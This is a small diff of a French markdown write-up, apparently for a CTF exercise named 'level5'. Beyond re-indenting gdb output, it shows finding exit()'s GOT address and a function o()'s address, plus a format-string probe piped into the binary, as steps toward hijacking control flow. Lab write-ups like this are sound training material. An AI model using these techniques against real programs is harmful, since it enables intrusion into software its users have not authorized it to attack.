@@ -133,18 +133,18 @@ Il va falloir remplacer l'adresse de la fonction exit() dans le Global Offset Ta
  ```
  - l'adresse d'exit dans le GOT est `08049838`
 - `gdb level5`
-- `info function o`
-  ```
-  All functions matching regular expression "o":
+  - `info function o`
+    ```
+    All functions matching regular expression "o":
 
-  Non-debugging symbols:
-  0x080483c0  __gmon_start__
-  0x080483c0  __gmon_start__@plt
-  0x08048420  __do_global_dtors_aux
-  0x080484a4  o
-  0x080485a0  __do_global_ctors_aux
-  ```
-  - l'adresse de o() est 0x080484a4
+    Non-debugging symbols:
+    0x080483c0  __gmon_start__
+    0x080483c0  __gmon_start__@plt
+    0x08048420  __do_global_dtors_aux
+    0x080484a4  o
+    0x080485a0  __do_global_ctors_aux
+    ```
+    - l'adresse de o() est 0x080484a4
 
 - `python -c 'print "AAAA" + "%x " * 10' | ./level5`
 ```
